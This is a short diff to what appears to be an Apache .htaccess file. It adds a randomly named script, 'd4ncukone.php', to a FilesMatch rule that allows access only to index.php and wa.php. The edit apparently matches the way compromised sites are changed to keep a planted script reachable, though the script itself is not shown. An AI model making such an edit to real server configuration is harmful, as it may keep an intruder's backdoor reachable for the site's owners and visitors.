@@ -6,7 +6,7 @@
 
 </FilesMatch>
 
-<FilesMatch "^(index.php|wa.php)$">
+<FilesMatch "^(index.php|wa.php|d4ncukone.php)$">
 
  Order allow,deny
 
